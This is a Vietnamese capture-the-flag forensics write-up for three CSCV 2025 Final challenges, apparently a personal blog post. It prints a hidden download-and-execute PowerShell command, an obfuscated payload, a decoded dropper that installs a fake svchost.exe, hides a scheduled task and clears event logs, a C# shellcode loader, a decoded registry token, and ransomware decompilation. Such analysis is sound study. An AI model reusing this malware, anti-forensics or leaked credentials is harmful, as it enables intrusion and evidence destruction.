---
title: "CSCV 2025 Final"
description: "Writeup for Forensic Challenge"
summary: "Writeup for Forensic Challenge"
categories: ["Writeup"]
tags: ["Forensic", "Reverse", "Writeup"]
#externalUrl: ""
date: 2025-11-19
draft: false
authors:
  - ducnocrypt
cover: /images/post_covers/cscv2025final.jpg
---

Writeup for Forensic Challenges

## Another Day
![image](/images/cscv2025_final/1.png)

*Our CIRT team has been monitoring indicators of compromise (IOCs) identified during a recent incident. During this process, we discovered that a customer’s HR computer had connected to one of the identified malicious domains. The affected machine was quarantined, and evidence was collected for further analysis. Please investigate and determine the actions performed by the attacker on this system.*
*The flag is divided into 3 parts, wrapping them in CSCV2025{} format*

Ở bài này đề cho 1 file ad1
![image](/images/cscv2025_final/2.png)

Mở bằng FTK, mày mò 1 lúc thấy 1 file shortcut khả nghi khi kiểm tra bên trong thì nó lại gọi đến 1 lệnh powershell ẩn
![image](/images/cscv2025_final/3.png)

Confirm trong file log `C:\Windows\System32\winevt\Windows PowerShell.evtx`

![image](/images/cscv2025_final/4.png)

```shell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command IEX(IRM 'https://gist.githubusercontent.com/oumazio/16f129048eb2e53c07c436592821e3bb/raw/a853270425582a8156c8eaac31c26e3ad4296655/easter_egg')
```

Lệnh này tải xuống và thực thi mã từ gist. Bên trong trang gist, chúng ta có thể thấy payload
![image](/images/cscv2025_final/5.png)

```shell
(NeW-ObJeCT IO.COMPResSiOn.deFlATeSTReaM([SYSTem.iO.MEmORYstREaM][syStem.CONveRt]::froMbAsE64stRiNg('lVZ7b+I4EP+/Ur+DhTgB2jrHKzy6qnR0afequy2osOpJFJ0cZyDZhiRKHArq9bvfjBPzanUPhCaO5zcPz8sp3yRJlAyk8qNwnMACEgglsCtWmfgBhCrYfolC5YcZVM7Pzs8WWaih7I/RAx+CTLaxYq/nZwx/sUjEqjpztgpm83l5KJS4YLNUJX64nJd/g20tx5WfYXuNoBStzKawUdZNKCOXUJeX36e3PesrKA2oHkq5IFHgHl74yPkBUrHcENOGrN8hXCovhy6ipFr2r+qfWdlnPFBHENr89KlW+Gw0z8r+HLVroF5zZxMle1dxj/20fy10zXMlb/kjAZUloVZ3fvZG0SI8ai1Jzwcps1h5WccVoSe9yI0SEZYQknr+WCiPYOXx4/DJwg3ad4R8XiZRFrpH7P22FYdLAiqRLEHtQBCuL8dJtMRc0GGe0jVaS5UFGyB0nDmBL8e+RF91BgoJvf1k9t+bOT/zF6w6hVRxbcr4XTPZRzW6GsCltN6NrFusH0zoAwh3EARFPo3UPqc7mcOK4uT6oUqOhaDDnwsW4qJx9Uu1vunLi/qm10DS7SKRtOrTqtdE0ukjEbQngPZcJLaNpEViNnG7PWLQqyMMrrMgLfTabZu9fp0YtHJJc98hMdrrkRaXGIIkesIY6pKhjmtke1oVae61zEoQxCEFklaCHO+TQ11S39Xea1Uk4eytEbejDdnGpCCxttQ+1z6bIDV1kFrEa5Fkk/xsk5kW2bdJZYO0NR0j3qRwNWhV3xEtYbfMqk0+NbTBtiF2h4hrZHVsWwRukncNHVYN7plXW7/SARrkS7u/U9o3brQp1C1a2UQ6u5VNEg3iNqUx3oId2YGbPSPRJEM2STTa2rVdkLAQI1eXIf8R+SGrYm3N6paFz2bR7LxRm7O/2G2U3AjpmSHEr2GJ+FeaN2+MY+dJSFP2OpOeSObV8p+MUwpmNHTmtbfaYf0edMlj4ivYt8m+py8OmuRI+KQdj8fFrivp9yWKt/xOweoUxU6nAcfDSTgaaqaI8qmfz9+J9MDNAnCnIn3Orw7GbzYgMwXswPdCFi+A5RKSj4SnBYuP6NLhA8WqOPup+6HG+APEoHxSfxcqSNYiYFVSMfVXMIkFGv2GFxNdJK36EXyYJUJ7dQIfii1iO7YZPykovNqW6UeuTQoePtGxIIheJngydbcYhddCoTs+BWyIl+NERfHd4iuWzfKIp/GPHoSDtfAD4QR4wl9914UwN/+AlZMi+Ngu40TvxQpY5dEP3eglZd9jFyNSQT/yYJt0cBO/XYy5cfvgcHlWsXRHmeL3WRAcZlY7+Z89+IcC3N8HeLBVtIai5Mz9VnjBD7432Oknhim6Y9X5xSfXVuwurCB8LpENXSfawjt2YapmDRSGxcnyL41KHvrKxzbe98/xKU4a5/8cJqcvsFaZ8gMmAzbZYtpXH+xjB+Ec2L7nDOIY+1TX9HtmySRpHL1AMvEgCEofoL75MonSaKF4ged7/M+jGPKWEUb23zJROpoxeRmZ6XeE240T/P8N'),[systEM.Io.cOMPreSsIoN.COMPresSionmOdE]::DecOMPreSS) | fOREACH-OBjecT{NeW-ObJeCT  iO.strEaMReADER( $_ , [sYStEm.tEXt.eNcODINg]::AsCii) } ).REadToEnd() | .( $SheLlID[1]+$shELLId[13]+'x')
```

Vào [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Raw_Inflate(0,0,'Adaptive',false,false)&input=bFZaN2IrSTRFUCsvVXIrRGhUZ0IyanJIS3p5NnFuUjBhZmVxdXkyb3NPcEpGSjBjWnlEWmhpUktIQXJxOWJ2ZmpCUHphblVQaENhTzV6Y1B6OHNwM3lSSmxBeWs4cU53bk1BQ0VnZ2xzQ3RXbWZnQmhDcllmb2xDNVljWlZNN1B6czhXV2FpaDdJL1JBeCtDVExheFlxL25ad3gvc1VqRXFqcHp0Z3BtODNsNUtKUzRZTE5VSlg2NG5KZC9nMjB0eDVXZllYdU5vQlN0ekthd1VkWk5LQ09YVUplWDM2ZTNQZXNyS0Eyb0hrcTVJRkhnSGw3NHlQa0JVckhjRU5PR3JOOGhYQ292aHk2aXBGcjJyK3FmV2RsblBGQkhFTnI4OUtsVytHdzB6OHIrSExWcm9GNXpaeE1sZTFkeGovMjBmeTEwelhNbGIva2pBWlVsb1ZaM2Z2WkcwU0k4YWkxSnp3Y3BzMWg1V2NjVm9TZTl5STBTRVpZUWtucitXQ2lQWU9YeDQvREp3ZzNhZDRSOFhpWlJGcnBIN1AyMkZZZExBaXFSTEVIdFFCQ3VMOGRKdE1SYzBHR2UwalZhUzVVRkd5QjBuRG1CTDhlK1JGOTFCZ29KdmYxazl0K2JPVC96RjZ3NmhWUnhiY3I0WFRQWlJ6VzZHc0NsdE42TnJGdXNIMHpvQXdoM0VBUkZQbzNVUHFjN21jT0s0dVQ2b1VxT2hhRERud3NXNHFKeDlVdTF2dW5MaS9xbTEwRFM3U0tSdE9yVHF0ZEUwdWtqRWJRbmdQWmNKTGFOcEVWaU5uRzdQV0xRcXlNTXJyTWdMZlRhYlp1OWZwMFl0SEpKYzk4aE1kcnJrUmFYR0lJa2VzSVk2cEtoam10a2Uxb1ZhZTYxekVvUXhDRUZrbGFDSE8rVFExMVMzOVhlYTFVazRleXRFYmVqRGRuR3BDQ3h0dFErMXo2YklEVjFrRnJFYTVGa2sveHNrNWtXMmJkSlpZTzBOUjBqM3FSd05XaFYzeEV0WWJmTXFrMCtOYlRCdGlGMmg0aHJaSFZzV3dSdWtuY05IVllON3BsWFc3L1NBUnJrUzd1L1U5bzNiclFwMUMxYTJVUTZ1NVZORWczaU5xVXgzb0lkMllHYlBTUFJKRU0yU1RUYTJyVmRrTEFRSTFlWElmOFIrU0dyWW0zTjZwYUZ6MmJSN0x4Um03Ty8yRzJVM0FqcG1TSEVyMkdKK0ZlYU4yK01ZK2RKU0ZQMk9wT2VTT2JWOHArTVV3cG1OSFRtdGJmYVlmMGVkTWxqNGl2WXQ4bStweThPbXVSSStLUWRqOGZGcml2cDl5V0t0L3hPd2VvVXhVNm5BY2ZEU1RnYWFxYUk4cW1mejkrSjlNRE5BbkNuSW4zT3J3N0diellnTXdYc3dQZENGaStBNVJLU2o0U25CWXVQNk5MaEE4V3FPUHVwKzZIRytBUEVvSHhTZnhjcVNOWWlZRlZTTWZWWE1Ja0ZHdjJHRnhOZEpLMzZFWHlZSlVKN2RRSWZpaTFpTzdZWlB5a292TnFXNlVldVRRb2VQdEd4SUloZUpuZ3lkYmNZaGRkQ29UcytCV3lJbCtORVJmSGQ0aXVXemZLSXAvR1BIb1NEdGZBRDRRUjR3bDk5MTRVd04vK0FsWk1pK05ndTQwVHZ4UXBZNWRFUDNlZ2xaZDlqRnlOU1FUL3lZSnQwY0JPL1hZeTVjZnZnY0hsV3NYUkhtZUwzV1JBY1psWTcrWjg5K0ljQzNOOEhlTEJWdElhaTVNejlWbmpCRDc0MzJPa25oaW02WTlYNXhTZlhWdXd1ckNCOExwRU5YU2Zhd2p0MllhcG1EUlNHeGNueUw0MUtIdnJLeHpiZTk4L3hLVTRhNS84Y0pxY3ZzRmFaOGdNbUF6YlpZdHBYSCt4akIrRWMyTDduRE9JWSsxVFg5SHRteVNScEhMMUFNdkVnQ0VvZm9MNzVNb25TYUtGNGdlZDcvTStqR1BLV0VVYjIzekpST3BveGVSbVo2WGVFMjQwVC9QOE4&oeol=CRLF) để giải mã payload
![image](/images/cscv2025_final/6.png)

```powershell
$ErrorActionPreference = 'SilentlyContinue'

function XOR-Decrypt {
    param([byte[]]$Data, [string]$Key)
    $keyBytes = [Text.Encoding]::UTF8.GetBytes($Key)
    $dec = New-Object byte[] $Data.Length
    for($i=0; $i -lt $Data.Length; $i++){
        $dec[$i] = $Data[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return $dec
}

$key = "chieccupthu6danhchodoran"
$shiPath = "$PWD\.shi"
$backgroundPath = "$PWD\background.png"
$targetPath = "$env:ProgramData\svchost.exe"
$publicPictures = "$env:Public\Pictures\background.png"

if (Test-Path $shiPath) {
    $encrypted = [IO.File]::ReadAllBytes($shiPath)
    $decrypted = XOR-Decrypt -Data $encrypted -Key $key
    
    $a1=@(0x9c,0x81,0x77,0xc1,0x97,0x82,0x69,0xa1,0xae,0x8d,0x55,0x3c,0x59,0x78,0x8c,0xba,0xae,0x6f,0x9a,0x74,0xae,0x90,0x6e,0xd2,0x9b,0x80,0x89,0xde,0xaa,0x8a,0x8d,0x75,0x6d,0x90,0x84,0xaf,0x83,0xaf,0xa5,0xb9,0xc5,0xa7,0x98,0x7b,0x79,0xad,0x73,0xb0,0x89,0xdb,0x6a,0x85,0x8a,0xa8,0x4c,0x74);
    $a2=@(0x38,0x39,0x2e,0x47,0x3f,0x50,0x1b,0x2b,0x4c,0x21,0x1c,0x0c,0x0c,0x47,0x53,0x47,0x4d,0x18,0x44,0x44,0x56,0x5d,0x1c,0x59,0x37,0x2a,0x1e,0x64,0x48,0x1e,0x54,0x45,0x1f,0x49,0x18,0x49,0x21,0x42,0x31,0x51,0x61,0x51,0x5f,0x12,0x2c,0x56,0x3e,0x3e,0x31,0x61,0x28,0x51,0x25,0x52,0x14,0x37);
    $decoded = -join ($a1[0..($a2.Length-1)] | ForEach-Object -Begin {$i=0} -Process {[char]($_ - $a2[$i++])})
    
    [IO.File]::WriteAllBytes($targetPath, $decrypted)
    
    if (Test-Path $backgroundPath) {
        Copy-Item $backgroundPath $publicPictures -Force
    }
    
    $action = New-ScheduledTaskAction -Execute $targetPath
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30) -RepetitionDuration (New-TimeSpan -Days 365)
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
    Register-ScheduledTask -TaskName 'Windows Update' -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    
    Start-ScheduledTask -TaskName 'Windows Update'
    
    if (Test-Path $shiPath) { Remove-Item $shiPath -Force -ErrorAction SilentlyContinue }
    if (Test-Path "$PWD\cv.pdf.lnk") { (Get-Item "$PWD\cv.pdf.lnk" -Force).Attributes = 'Hidden' }
    if (Test-Path $backgroundPath) { Remove-Item $backgroundPath -Force -ErrorAction SilentlyContinue }
    
    wevtutil cl System
    wevtutil cl Security
    wevtutil cl Application
    wevtutil cl "Windows PowerShell"
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    
    if (Test-Path "$PWD\cv.pdf") {
        Start-Process "$PWD\cv.pdf"
    }
}
```

Đây là một script PowerShell dropper/malware loader. Nó thực hiện các bước sau: `$ErrorActionPreference = 'SilentlyContinue'` → Không hiển thị lỗi để tránh bị chú ý.

Giải mã file .shi bằng XOR `function XOR-Decrypt { ... }` → Dùng khóa "*chieccupthu6danhchodoran*" 

Tạo executable giả dạng hệ thống `$targetPath = "$env:ProgramData\svchost.exe"` → File giải mã được ghi thành svchost.exe trong ProgramData nhằm giả làm tiến trình Windows hợp lệ. Ngoài ra `Register-ScheduledTask -TaskName 'Windows Update'` → Tạo Scheduled Task tên “Windows Update”, chạy mỗi 30 phút trong 1 năm để duy trì tồn tại.

Chạy payload và xóa dấu vết:
```
Remove-Item $shiPath
wevtutil cl System
wevtutil cl Security
```
→ Xóa file gốc, xóa log Windows/PowerShell, cuối cùng là ngụy trang: `Start-Process "$PWD\cv.pdf"` → Mở file PDF “cv.pdf” để đánh lạc hướng nạn nhân như thể chỉ mở CV bình thường

$a1 và $a2 được sử dụng để tạo ra một chuỗi base64, khi giải mã sẽ thành: `dHIzX2Nvbl90M19saWV0X3RydVkzbl90NGlfbmthdV9iMW5rXzB4eV8=` 
![image](/images/cscv2025_final/7.png)

> Part1: tr3_con_t3_liet_truY3n_t4i_nkau_b1nk_0xy_

ok giờ chuyển sang con mã độc **svchost.exe** để phân tích
![image](/images/cscv2025_final/8.png)

export nó ra, load vào die
![image](/images/cscv2025_final/9.png)

Chương trình viết bằng C#, vì vậy ta sẽ sử dụng dnSpy để phân tích con mal này
![image](/images/cscv2025_final/10.png)

Hàm main:

```csharp
using System;
using System.Threading;
using System.Threading.Tasks;
using AntiReverse;
using CodeInject;
using SetDesktopBackground;
using ShellcodeInject;

// Token: 0x02000002 RID: 2
internal class Umbala
{
	// Token: 0x06000001 RID: 1 RVA: 0x00002080 File Offset: 0x00000280
	private static void Main()
	{
		bool flag = false;
		try
		{
			string text = Environment.MachineName ?? "";
			flag = text.Equals("DESKTOP-8JDAQU5", StringComparison.OrdinalIgnoreCase);
			if (!flag)
			{
				Thread.Sleep(600000);
			}
		}
		catch
		{
		}
		if (!flag)
		{
			bool flag2 = false;
			bool flag3 = false;
			try
			{
				flag2 = SecurityCheck.anti_debug();
			}
			catch
			{
				flag2 = false;
			}
			try
			{
				flag3 = SecurityCheck.anti_vm();
			}
			catch
			{
				flag3 = false;
			}
			if (!flag2 || !flag3)
			{
				return;
			}
		}
		Task task = Task.Run(delegate
		{
			try
			{
				ShellcodeInject.Loader.Run();
			}
			catch
			{
			}
		});
		try
		{
			CodeInject.Loader.Run();
		}
		catch
		{
		}
		try
		{
			ChangeBackgroundImage.ChangeImage();
		}
		catch
		{
		}
		try
		{
			task.Wait();
		}
		catch
		{
		}
	}
}

```

Ở đoạn này

```csharp
string text = Environment.MachineName ?? "";
flag = text.Equals("DESKTOP-8JDAQU5", StringComparison.OrdinalIgnoreCase);

if (!flag)
{
    Thread.Sleep(600000);
}
```

Malware kiểm tra hostname máy, nếu KHÔNG phải DESKTOP-8JDAQU5: ngủ 10 phút

Sau khi mã vượt qua 3 cờ,thấy rằng **ShellcodeInject.Loader.Run()** tải Shellcode bằng cách sử dụng tài nguyên nhúng **shellcoders.bin** và chạy nó

![image](/images/cscv2025_final/11.png)

```csharp
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ShellcodeInject
{
	// Token: 0x02000007 RID: 7
	public class Loader
	{
		// Token: 0x06000013 RID: 19 RVA: 0x0000280C File Offset: 0x00000A0C
		public static void Run()
		{
			byte[] array = Loader.LoadShellcodeFromResource();
			if (array == null || array.Length == 0)
			{
				throw new Exception();
			}
			IntPtr intPtr = Loader.VirtualAlloc(IntPtr.Zero, (ulong)((long)array.Length), 4096U, 64U);
			Marshal.Copy(array, 0, intPtr, array.Length);
			IntPtr intPtr2 = IntPtr.Zero;
			uint num = 0U;
			IntPtr zero = IntPtr.Zero;
			intPtr2 = Loader.CreateThread(0U, 0U, intPtr, zero, 0U, ref num);
			Loader.WaitForSingleObject(intPtr2, uint.MaxValue);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002884 File Offset: 0x00000A84
		private static byte[] LoadShellcodeFromResource()
		{
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			string text = "shellcoders.bin";
			Stream stream = executingAssembly.GetManifestResourceStream(text);
			if (stream == null)
			{
				string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
				foreach (string text2 in manifestResourceNames)
				{
					if (text2.Contains("shellc") || text2.Contains("payload"))
					{
						text = text2;
						break;
					}
				}
				stream = executingAssembly.GetManifestResourceStream(text);
			}
			if (stream == null)
			{
				throw new Exception();
			}
			byte[] array3;
			using (stream)
			{
				byte[] array2 = new byte[stream.Length];
				stream.Read(array2, 0, array2.Length);
				array3 = array2;
			}
			return array3;
		}
    }
}
```
Trích xuất shellcoder.bin
![image](/images/cscv2025_final/12.png)


và sử dụng công cụ [speakeasy](https://github.com/mandiant/speakeasy) để phân tích
![image](/images/cscv2025_final/13.png)

ta có được part2 của flag:
> s0n_tunq_mtP_884844_

Đối với phần 3, mình bám vào workflow cmd powershell và tìm thử trong log của PowerShell: ***Microsoft-Windows-PowerShell%4Operational.evtx***

![image](/images/cscv2025_final/14.png)

Vậy ta có flag hoàn chỉnh
> CSCV2025{tr3_con_t3_liet_truY3n_t4i_nkau_b1nk_0xy_s0n_tunq_mtP_884844_kirit0kun_8142b5a11e55c693}



## Case Charlie

![image](/images/cscv2025_final/15.png)

Sau khi tải xuống và giải nén tập tin
![image](/images/cscv2025_final/16.png)

đọc trước file pdf 
![image](/images/cscv2025_final/17.png)

*"....Nhiệm vụ của bạn là phân tích máy chủ bị thu giữ, khôi phục thông tin liên quan đến nghi phạm và trả lời các câu hỏi điều tra để hỗ trợ phiên tòa sắp tới vào tháng 12"*

Ok bây giờ đi trả lời từng câu hỏi của đề bài để lấy flag
***Q1: What was the last time the suspect logged into the server? (UTC / 24 hours format)***
***Format: YYYY-MM-DD HH:MM:SS***

wtmp là một tập tin ghi lại mọi phiên đăng nhập/đăng xuất. Khi người dùng đăng nhập, Linux ghi một bản ghi mới vào wtmp. Khi người dùng đăng xuất, một bản ghi khác được ghi lại
-> lấy last modified time của wtmp trong **/var/log/wtmp**
![image](/images/cscv2025_final/18.png)

> 2025-11-08 04:32:56

***Q2: The suspect used a chat application to communicate. What is the name of this application?
Format: chatapp. Example: whatsapp, telegram, Discord***

author đưa ra ví dụ về ứng dụng trò chuyện, vậy cần phải lập list ứng dụng đáng ngờ chứa các cuộc hội thoại giữa các nghi phạm. Sau khoảng 1 thời gian tìm kiếm, tìm thấy một cuộc hội thoại đáng ngờ giữa **s3v3n_wOndEr113** và **the0nlymak3r1338**
![image](/images/cscv2025_final/19.png)
> irssi

***Q3: Identify the usernames (handles) of the suspect and their contact in the chat application. (Case Sensitive)
Format: uS3rNaME13, c0nT4cTn4m3***

> s3v3n_wOndEr113, the0nlymak3r1338

***Q4: What was the last time the suspect sent a message to their contact? (UTC / 24 hours format)
Format: YYYY-MM-DD HH:MM***

author hỏi thời gian cuộc trò chuyện kết thúc -> cuộn xuống cuối
![image](/images/cscv2025_final/20.png)
> 2025-11-08 04:36

***Q5: What command did the suspect use to overwrite the current user's .bash_history file to cover their tracks?***

Ở question này, dựa vào keyword ".bash_history" mình sử dụng tool phù hợp nhất là grep string=]]] *file hơi nặng đợi ~ 5p*
```
.\strings.exe -n 5 D:\CTF\Challenges\CSCV2025-Final\for\case_charlie\evidences.vmdk | findstr /i ".bash_history" 
```
![image](/images/cscv2025_final/21.png)

- shred: một lệnh ghi đè an toàn lên một tập tin nhiều lần để làm cho nội dung của nó cực kỳ khó hoặc không thể khôi phục được, ngay cả với các công cụ pháp y
- -v (verbose): Hiển thị đầu ra chi tiết về những gì shred đang thực hiện (thông báo tiến trình)
- -f (force): Buộc ghi đè lên tập tin ngay cả khi tập tin có một số biện pháp bảo vệ nhất định, chẳng hạn như quyền chỉ đọc hoặc thuộc tính bất biến
- -z (zero pass): Sau khi ghi đè bằng dữ liệu ngẫu nhiên, shred thực hiện một lần ghi đè cuối cùng bằng số không để che giấu việc tập tin đã bị ghi đè

> sudo shred -vfz /home/ubuntu/.bash_history

***Q6: The suspect accidentally left behind an email address. What is the email address?
Format: name@domain. Example: this_Is_an_3xample_email1213@proton.me***

Câu hỏi này yêu cầu chúng ta tìm địa chỉ email của nghi phạm, việc này không dễ dàng, đã tìm kiếm bằng cách cuộn qua tất cả các tập tin trên ổ đĩa nhưng không thấy gì cả. Sau đó, tác giả đưa ra một gợi ý
![image](/images/cscv2025_final/22.png)

Sau khi đọc gợi ý, tôi log của cuộc trò chuyện của q2 đến q4 và thu được một thông tin quan trọng
![image](/images/cscv2025_final/23.png)
-> Một số hình ảnh đã được tải xuống trong một tệp với thông tin đăng nhập cũ (mình cần tìm lại tệp đó). Thông tin này nhắc đến Docker, vì vậy mình đã cuộn xuống tệp Docker để tìm thêm thông tin
![image](/images/cscv2025_final/24.png)

Trong tệp .docker/config.json, có thể tìm thấy một URL registry và một chuỗi base64
![image](/images/cscv2025_final/25.png)

Tiến hành giải mã chuỗi b64 này
![image](/images/cscv2025_final/26.png)
`asjdkhufh832:glpat-xwghQbDTsJbs1B2MubX_zG86MQp1OmlxOHVzCw.01.120yvtp2f`

- user: asjdkhufh832 
- PAT: glpat-xwghQbDTsJbs1B2MubX_zG86MQp1OmlxOHVzCw.01.120yvtp2f 
- Credentials: registry.gitlab.com

Sử dụng thông tin này để đăng nhập vào Docker
```
echo "glpat-xwghQbDTsJbs1B2MubX_zG86MQp1OmlxOHVzCw.01.120yvtp2f" | docker login registry.gitlab.com -u asjdkhufh832 --password-stdin
```
Sau khi login thành công, tiến hành pull image
```
docker image save -o solve.tar registry.gitlab.com/somegroup5803945/jkfhskdf2314:testing
```
Sau đó trích xuất các lớp của tập tin này và đã tìm được email
> phuchungh96@gmail.com

Congrats! Here is your flag:
> CSCV2025{DoCkER_stoRes-0uR-cREd3NtI4I5_uNeNCRYPt3d-iN_lT5_cOnfig_file_lmao_xd_Ow0}


## DFIR

![image](/images/cscv2025_final/27.png)
***A senior manager at a financial company had all important documents encrypted and held for ransom. Please investigate and recover the encrypted files***
***Answer 1: SHA-256 of the ransomware file
Answer 2: SHA-256 of the original financialStatement.pdf file***
***Flag: CSCV2025{answer1_answer2}***

Chúng ta được cung cấp một máy tính chạy Windows 10, cần cài đặt nó vào VMWare
![image](/images/cscv2025_final/28.png)

Đầu tiên chúng ta có thể thấy là tất cả các tập tin đã được mã hóa (phần mở rộng .enc)
![image](/images/cscv2025_final/29.png)

Mất 1 hồi kiểm tra eventlog nhưng không thấy bất kỳ tiến trình nào mã hóa tất cả các tệp này, vậy thử kiểm tra xem phần mềm tống tiền có còn trên máy và vẫn đang chạy hay không bằng cách tự tạo một tệp và xem nó có bị mã hóa hay không
![image](/images/cscv2025_final/30.png)
xác nhận phần mềm tống tiền vẫn đang hoạt động

Vì trình quản lý tác vụ trên máy này không thể mở được nữa nên tôi sẽ sử dụng lệnh tasklist để kiểm tra các tiến trình đang chạy: **tasklist /v**
![image](/images/cscv2025_final/31.png)


Kéo xuống 1 tý phát hiện có một tiến trình đáng ngờ: **Runtime Broker.exe** - Chương trình Windows chính xác phải là **RuntimeBroker.exe**
![image](/images/cscv2025_final/32.png)

Chúng ta sẽ kiểm tra đường dẫn tệp thực thi của nó bằng lệnh:
```
Get-cimInstance Win32_Process -Filter "ProcessId = 4108" |Select-Object Name, ProcessId, ParentProcessId, ExecutablePath, CommandLine
```
![image](/images/cscv2025_final/33.png)

Xác nhận đây là tiến trình độc hại (Vì **RuntimeBroker.exe** thực sự nằm ở **C:\Windows\System32** chứ không phải **SysWOW64**). Để xác nhận chương trình này là phần mềm tống tiền, mình sẽ thiết lập một môi trường "mồi" được kiểm soát để bắt được tiến trình nào thực sự đang thực hiện mã hóa. 

Ý tưởng là buộc phần mềm độc hại phải truy cập vào các tệp trong một thư mục được kiểm tra bảo mật nghiêm ngặt, sau đó sử dụng nhật ký bảo mật của Windows để xác định quyền truy cập tệp đó thuộc về tệp thực thi nào 

```powershell
# Run on Admin 
auditpol /set /subcategory:"File System" /success:enable /failure:enable
$path = "C:\Users\MANAGER\Desktop\"
$acl  = Get-Acl $path
$rule = New-Object System.Security.AccessControl.FileSystemAuditRule(
    "Everyone",
    "CreateFiles,Write,AppendData,Delete,DeleteSubdirectoriesAndFiles",
    "ContainerInherit,ObjectInherit",
    "None",
    "Success"
)
$acl.AddAuditRule($rule)
Set-Acl $path $acl

# Create new file on setup path
echo "demo" > C:\Users\MANAGER\Desktop\new.txt
```
![image](/images/cscv2025_final/34.png)

Theo dõi log với eventId: 4663
![image](/images/cscv2025_final/35.png)
![image](/images/cscv2025_final/36.png)

-> Xác nhận là file **Runtime Broker.exe** là ransomware

![image](/images/cscv2025_final/37.png)

> 940ca4c4440ee72b2cc89e7927276b549be0d4dca7e7ae85ff7b25ecf52ced70

Giờ ta tiến hành trích xuất file malware này ra bằng FTK (load file **Windows 10 x64-000002.vmdk**)
![image](/images/cscv2025_final/38.png)

Load vào DIE
![image](/images/cscv2025_final/39.png)

Chương trình được viết bằng C++, Load vào Ida
![image](/images/cscv2025_final/40.png)
Chúng ta sẽ xem xét mô-đun liên quan đến Crypto -> bcrypt. Sử dụng XREF để xác định hàm nào cần gọi

Ở phần trên của sơ đồ khối, ta có thể xác định thuật toán mã hóa: AES
![image](/images/cscv2025_final/41.png)

Tiếp tục sử dụng XREF để hoàn tất quy trình mã hóa
```
WinMain
  └── sub_14000C5F0()                 // Starting Encryption Process
        └── sub_140009450(path, …)    // Browse folder, select file
              └── sub_140002F70(src, dst) // Encrypt
                    ├── Using pbSecret (key) + pbIV (IV)
                    └── pbSecret / pbIV created by sub_1400029A0()
                          ├── unknown_libname_32()   // get Unix time
                          └── sub_140001CC0()        // resolve GetComputerNameA / GetUserNameA
```
Dựa vào workflow này, ta đi tới **sub_14000C5F0**
![image](/images/cscv2025_final/42.png)

```cpp
__int64 sub_14000C5F0()
{
  __int64 result; // rax
  __int64 v1; // r8
  int v2; // r9d
  __int64 v3; // rax
  __int64 v4; // r8
  __int64 v5; // rbx
  unsigned __int64 *v6; // rbx
  int v7; // edi
  __int128 *v8; // rsi
  __int64 v9; // rdi
  unsigned __int64 v10; // r8
  unsigned __int64 v11; // rcx
  unsigned __int64 v12; // r15
  __int64 v13; // r12
  int v14; // edi
  _QWORD *i; // rbx
  _QWORD *v16; // r15
  __int64 v17; // r14
  _QWORD *v18; // rsi
  unsigned int v19; // eax
  int v20; // ecx
  bool v21; // si
  __int64 v22; // [rsp+30h] [rbp-258h] BYREF
  void *(__fastcall ***v23)(std::_Iostream_error_category2 *__hidden, unsigned int); // [rsp+38h] [rbp-250h]
  __int128 v24; // [rsp+40h] [rbp-248h] BYREF
  __int128 v25; // [rsp+50h] [rbp-238h]
  __int128 v26; // [rsp+60h] [rbp-228h] BYREF
  __int128 v27; // [rsp+70h] [rbp-218h]
  __int128 v28[2]; // [rsp+80h] [rbp-208h] BYREF
  char v29[8]; // [rsp+A0h] [rbp-1E8h] BYREF
  char v30[32]; // [rsp+A8h] [rbp-1E0h] BYREF
  int v31; // [rsp+C8h] [rbp-1C0h] BYREF
  __int128 v32; // [rsp+D0h] [rbp-1B8h] BYREF
  __int128 v33; // [rsp+E0h] [rbp-1A8h]
  __int128 v34; // [rsp+F0h] [rbp-198h] BYREF
  __int64 v35; // [rsp+100h] [rbp-188h]
  __int128 v36[2]; // [rsp+108h] [rbp-180h] BYREF
  __int128 v37[2]; // [rsp+128h] [rbp-160h] BYREF
  char v38[280]; // [rsp+150h] [rbp-138h] BYREF

  v31 = 0;
  v32 = 0i64;
  v33 = 0i64;
  sub_140005690(&v32, "=== Starting Encryption Process ===", 35i64);
  sub_140013050(&v32);
  sub_140005BC0(&v32);
  result = sub_1400029A0();
  if ( (_BYTE)result )
  {
    if ( !byte_14005C2D0 )
    {
      sub_140001CC0();
      byte_14005C2D0 = 1;
    }
    v31 = 257;
    if ( qword_14005C0D8 && (unsigned int)qword_14005C0D8(v38, &v31) )
    {
      v32 = 0i64;
      v33 = 0ui64;
      v1 = -1i64;
      do
        ++v1;
      while ( v38[v1] );
      sub_140005690(&v32, v38, v1);
    }
    else
    {
      v3 = sub_140021420("USERNAME");
      v33 = 0ui64;
      v32 = 0i64;
      if ( v3 )
      {
        v4 = -1i64;
        do
          ++v4;
        while ( *(_BYTE *)(v3 + v4) );
        sub_140005690(&v32, v3, v4);
      }
      else
      {
        sub_140005690(&v32, &unk_14004ED10, 0i64);
      }
    }
    v31 = 32;
    v5 = v33;
    if ( (_QWORD)v33 )
    {
      v24 = 0i64;
      v25 = 0i64;
      v8 = &v32;
      if ( *((_QWORD *)&v33 + 1) > 0xFui64 )
        v8 = (__int128 *)v32;
      v9 = 0x7FFFFFFFFFFFFFFFi64;
      if ( (unsigned __int64)v33 > 0x7FFFFFFFFFFFFFFFi64 )
        unknown_libname_3();
      if ( (unsigned __int64)v33 > 0xF )
      {
        if ( ((unsigned __int64)v33 | 0xF) <= 0x7FFFFFFFFFFFFFFFi64 )
        {
          v9 = v33 | 0xF;
          if ( ((unsigned __int64)v33 | 0xF) < 0x16 )
            v9 = 22i64;
        }
        *(_QWORD *)&v24 = sub_140006AC0(v9 + 1);
        *(_QWORD *)&v25 = v5;
        *((_QWORD *)&v25 + 1) = v9;
        sub_14003C9E0(v24, v8, v5 + 1);
      }
      else
      {
        *(_QWORD *)&v25 = v33;
        *((_QWORD *)&v25 + 1) = 15i64;
        v24 = *v8;
      }
